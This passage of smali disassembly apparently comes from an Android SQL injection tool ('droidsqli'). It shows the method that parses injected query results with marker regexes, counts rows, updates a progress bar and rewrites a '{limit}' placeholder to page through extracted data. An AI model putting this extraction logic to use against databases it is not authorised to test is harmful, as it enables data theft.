    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v4}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v12

    .line 1238
    .local v12, "regexSearch2":Ljava/util/regex/Matcher;
    invoke-virtual {v11}, Ljava/util/regex/Matcher;->find()Z

    move-result v18

    if-eqz v18, :cond_b

    .line 1239
    const-string v18, "hh[0-9A-F]+$"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v6}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v18

    const-string v19, ""

    invoke-virtual/range {v18 .. v19}, Ljava/util/regex/Matcher;->replaceAll(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1248
    :cond_7
    :goto_5
    const-string v18, "(h[0-9A-F]*jj[0-9A-F]*c?h)"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v6}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v11

    .line 1250
    const/4 v9, 0x0

    .line 1251
    :goto_6
    invoke-virtual {v11}, Ljava/util/regex/Matcher;->find()Z

    move-result v18

    if-nez v18, :cond_c

    .line 1254
    move v8, v9

    .line 1258
    if-lez v10, :cond_8

    if-eqz v13, :cond_8

    .line 1259
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    const-string v20, "update-progressbar"

    const/16 v21, 0x2

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v21, v0

    const/16 v22, 0x0

    aput-object v13, v21, v22

    const/16 v22, 0x1

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v23

    aput-object v23, v21, v22

    invoke-direct/range {v18 .. v21}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 1265
    :cond_8
    if-ne v8, v10, :cond_d

    .line 1267
    if-lez v10, :cond_0

    if-eqz v13, :cond_0

    .line 1268
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    const-string v20, "update-progressbar"

    const/16 v21, 0x2

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v21, v0

    const/16 v22, 0x0

    aput-object v13, v21, v22

    const/16 v22, 0x1

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v23

    aput-object v23, v21, v22

    invoke-direct/range {v18 .. v21}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_2

    .line 1182
    .end local v9    # "nbResult":I
    .end local v12    # "regexSearch2":Ljava/util/regex/Matcher;
    :catch_1
    move-exception v5

    .line 1183
    .local v5, "e":Ljava/lang/IllegalStateException;
    if-eqz v13, :cond_9

    .line 1184
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    const-string v20, "end-progress"

    move-object/from16 v0, v18

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-direct {v0, v1, v2, v13}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 1186
    :cond_9
    new-instance v18, Lnet/edgard/droidsqli/exception/PreparationException;

    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "=> "

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, " has no data"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v18

    .line 1195
    .end local v5    # "e":Ljava/lang/IllegalStateException;
    .restart local v9    # "nbResult":I
    :cond_a
    add-int/lit8 v9, v9, 0x1

    goto/16 :goto_4

    .line 1240
    .restart local v12    # "regexSearch2":Ljava/util/regex/Matcher;
    :cond_b
    invoke-virtual {v12}, Ljava/util/regex/Matcher;->find()Z

    move-result v18

    if-eqz v18, :cond_7

    .line 1241
    new-instance v18, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v19, "jj31chh"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    goto/16 :goto_5

    .line 1252
    :cond_c
    add-int/lit8 v9, v9, 0x1

    goto/16 :goto_6

    .line 1276
    :cond_d
    const-string v18, "\\{limit\\}"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v18

    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "+limit+"

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, ",65536"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    invoke-virtual/range {v18 .. v19}, Ljava/util/regex/Matcher;->replaceAll(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 1277
    const/16 v16, 0x1

    .line 1278
    const-string v4, ""

    .line 1087
    .end local v12    # "regexSearch2":Ljava/util/regex/Matcher;
    :cond_e
    :goto_7
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v18

    add-int/lit8 v16, v18, 0x1

    goto/16 :goto_0

    .line 1282
    :cond_f
    if-lez v10, :cond_0

    if-eqz v13, :cond_0

    .line 1283
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    const-string v20, "update-progressbar"

    const/16 v21, 0x2

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v21, v0

    const/16 v22, 0x0

    aput-object v13, v21, v22

    const/16 v22, 0x1

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v23

    aput-object v23, v21, v22

    invoke-direct/range {v18 .. v21}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_2

    .line 1290
    :cond_10
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v18

    rem-int/lit8 v18, v18, 0x2

    if-nez v18, :cond_e

    .line 1291
    const/16 v18, 0x0

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v19

    add-int/lit8 v19, v19, -0x1

    move/from16 v0, v18

    move/from16 v1, v19

    invoke-virtual {v4, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    goto :goto_7
.end method
